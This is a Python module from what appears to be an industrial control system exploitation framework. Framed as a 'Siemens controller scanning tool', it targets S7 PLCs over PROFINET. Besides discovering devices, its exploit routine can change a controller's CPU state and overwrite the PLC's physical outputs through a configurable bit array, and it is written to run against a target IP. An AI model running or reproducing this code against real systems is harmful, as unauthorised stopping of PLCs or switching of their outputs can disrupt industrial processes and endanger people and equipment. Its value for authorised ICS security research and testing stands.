#!/usr/bin/env python
# coding=utf-8

from core.exploit import *
from FullSiemensScan import *


class NewOptions:
    def __int__(self):
        self.src_tsap = ''
        self.dst_tsap = ''


class MyScript(BaseExploit):
    register_info = {
        'ID' : 'ICF-2017-F0010009',
        'Name' : 'Siemens控制器扫描工具',
        'Author' : 'Dsrk_Alex',
        'License': ISF_LICENSE,
        'Create_Date' : '2017-12-07',
        'Description' : '''Siemens控制器扫描工具，目前支持S7''',
    }

    register_options = [
        mkopt("--Interface", help="Interface Name e.g eth0, en0.", type="string", default="eth0"),
        mkopt("--LoopTime", help="Timeout for blocking network calls (in seconds).", type="string", default="5"),
        mkopt("--Command", help="The type of Command", type="string", default="FlashLED"),
        mkopt("--Arrays", help="What outputs to set please? [00000000].", type="string", default="00000000"),
    ]

    def flashLED(self, ip, inter, lp):
        interfaces = getAllInterfaces()
        mac_address = get_if_hwaddr(inter)
        npfdevice = None
        macaddr = None
        winguid = None
        for i in interfaces:
            if i[2] == mac_address:
                npfdevice = i[0]
                macaddr = i[2].replace(':', '') # eg: 'ab58e0ff585a'
                winguid = i[4]

        if not npfdevice:
            return

        if os.name == 'nt': npfdevice = '\Device\NPF_' + winguid

        dmac = getMac(ip, inter)
        device={}
        device['name_of_station'] = ''
        device['mac_address'] = dmac
        flashLED(npfdevice, device, macaddr, lp)

    def getdevice(self,ip_addr,inter):
        interfaces = getAllInterfaces()
        mac_address = get_if_hwaddr(inter)
        npfdevice = None
        macaddr = None
        winguid = None
        for i in interfaces:
            if i[2] == mac_address:
                npfdevice = i[0]
                macaddr = i[2].replace(':', '') # eg: 'ab58e0ff585a'
                winguid = i[4]

        if not npfdevice:
            return

        if os.name == 'nt': npfdevice = '\Device\NPF_' + winguid


        adapter=npfdevice
        if os.name == 'nt': npfdevice = '\Device\NPF_' + winguid
        print('Using adapter ' + adapter + '\n')

        ## Start building discovery packet
        print('Building packet')

        ## Sending the raw packet (packet itself is returned) (8100 == PN_DCP, 88cc == LDP)
        packet = sendRawPacket(npfdevice, '8100', macaddr)
        print('\nPacket has been sent (' + str(len(packet)) + ' bytes)')

        ## Receiving packets as bytearr (88cc == LDP, 8892 == device PN_DCP)
        print('\nReceiving packets over 2 seconds ...\n')
        receivedDataArr = receiveRawPackets(npfdevice, 2, macaddr, '8892')
        print
        print('Saved ' + str(len(receivedDataArr)) + ' packets')
        print

        ## Now we parse:
        if len(receivedDataArr) == 0:
            print('No devices found, ending it...')
            endIt()

        print('These are the devices detected (' + str(len(receivedDataArr)) + '):')
        print '{0:17} | {1:20} | {2:20} | {3:15} | {4:9}'.format('MAC address', 'Device', 'Device Type', 'IP Address', 'Vendor ID')
        deviceArr = []
        for packet in receivedDataArr:
            hexdata = hexlify(bytearray(packet))[28:] # take off ethernet header
            ## Parse function returns type_of_station, name_of_station, vendor_id, device_id, device_role, ip_address, subnet_mask, standard_gateway
            ##  takes 'translate' as a parameter, which will add these parsings:
            ##   (vendor id 002a == siemens) (device id 0a01=switch, 0202=simulator, 0203=s7-300 CP, 0101=s7-300 ...)
            ##   (0x01==IO-Device, 0x02==IO-Controller, 0x04==IO-Multidevice, 0x08==PN-Supervisor), (0000 0001, 0000 0010, 0000 0100, 0000 1000)
            ## Getting MAC address from packet, formatting with ':' in between
            mac = ':'.join(re.findall('(?s).{,2}', str(hexlify(bytearray(packet))[6*2:12*2])))[:-1]
            result = parseResponse(hexdata, mac)
            if result['ip_address']==ip_addr:
                deviceArr.append(result)
                devicename = str(result['name_of_station'])
                if devicename == '': devicename = str(result['type_of_station'])
                #print('{0:17} | {1:20} | {2:20} | {3:15} | {4:9}'.format(mac, devicename, result['type_of_station'], result['ip_address'], result['vendor_id']))
        return deviceArr[0]

    def ScanDevices(self,inter):
        interfaces = getAllInterfaces()
        mac_address = get_if_hwaddr(inter)
        npfdevice = None
        macaddr = None
        winguid = None
        for i in interfaces:
            if i[2] == mac_address:
                npfdevice = i[0]
                macaddr = i[2].replace(':', '') # eg: 'ab58e0ff585a'
                winguid = i[4]

        if not npfdevice:
            return

        if os.name == 'nt': npfdevice = '\Device\NPF_' + winguid


        adapter=npfdevice
        if os.name == 'nt': npfdevice = '\Device\NPF_' + winguid
        print('Using adapter ' + adapter + '\n')

        ## Start building discovery packet
        print('Building packet')

        ## Sending the raw packet (packet itself is returned) (8100 == PN_DCP, 88cc == LDP)
        packet = sendRawPacket(npfdevice, '8100', macaddr)
        print('\nPacket has been sent (' + str(len(packet)) + ' bytes)')

        ## Receiving packets as bytearr (88cc == LDP, 8892 == device PN_DCP)
        print('\nReceiving packets over 2 seconds ...\n')
        receivedDataArr = receiveRawPackets(npfdevice, 2, macaddr, '8892')
        print
        print('Saved ' + str(len(receivedDataArr)) + ' packets')
        print

        ## Now we parse:
        if len(receivedDataArr) == 0:
            print('No devices found, ending it...')
            endIt()

        print('These are the devices detected (' + str(len(receivedDataArr)) + '):')
        print '{0:17} | {1:20} | {2:20} | {3:15} | {4:9}'.format('MAC address', 'Device', 'Device Type', 'IP Address', 'Vendor ID')
        deviceArr = []
        for packet in receivedDataArr:
            hexdata = hexlify(bytearray(packet))[28:] # take off ethernet header
            ## Parse function returns type_of_station, name_of_station, vendor_id, device_id, device_role, ip_address, subnet_mask, standard_gateway
            ##  takes 'translate' as a parameter, which will add these parsings:
            ##   (vendor id 002a == siemens) (device id 0a01=switch, 0202=simulator, 0203=s7-300 CP, 0101=s7-300 ...)
            ##   (0x01==IO-Device, 0x02==IO-Controller, 0x04==IO-Multidevice, 0x08==PN-Supervisor), (0000 0001, 0000 0010, 0000 0100, 0000 1000)
            ## Getting MAC address from packet, formatting with ':' in between
            mac = ':'.join(re.findall('(?s).{,2}', str(hexlify(bytearray(packet))[6*2:12*2])))[:-1]
            result = parseResponse(hexdata, mac)

            deviceArr.append(result)
            devicename = str(result['name_of_station'])
            if devicename == '': devicename = str(result['type_of_station'])
            print('{0:17} | {1:20} | {2:20} | {3:15} | {4:9}'.format(mac, devicename, result['type_of_station'], result['ip_address'], result['vendor_id']))


    def ListInfo(self,ip_addr,inter):
        device=self.getdevice(ip_addr,inter)
        getInfo(device)

    def ChangeState(self,ip_addr,inter):
        device=self.getdevice(ip_addr,inter)
        manageCPU(device)

    def PrintOutputs(self,ip_addr,inter):
        device=self.getdevice(ip_addr,inter)
        manageOutputs1(device)

    def ChangeOut(self,ip_addr,inter,arr_tmp):
        device=self.getdevice(ip_addr,inter)
        changeOutputs(device,arr_tmp)



    def exploit(self, *args, **kwargs):
        inter = self.getParam("Interface")

        cd = self.getParam("Command")

        if cd == 'FlashLED':
            lp = int(self.getParam("LoopTime"))
            self.flashLED(self.TargetIp, inter, lp)

        elif cd=='ListInfo':
            self.ListInfo(self.TargetIp,inter)

        elif cd=='ChangeState':
            self.ChangeState(self.TargetIp,inter)

        elif cd=='PrintOutputs':
            self.PrintOutputs(self.TargetIp,inter)

        elif cd=='ChangeOutputs':
            arr_tmp=self.getParam("Arrays")
            self.ChangeOut(self.TargetIp,inter,arr_tmp)

        elif cd=='ScanDevices':
            self.ScanDevices(inter)





MainEntry(MyScript, __name__)
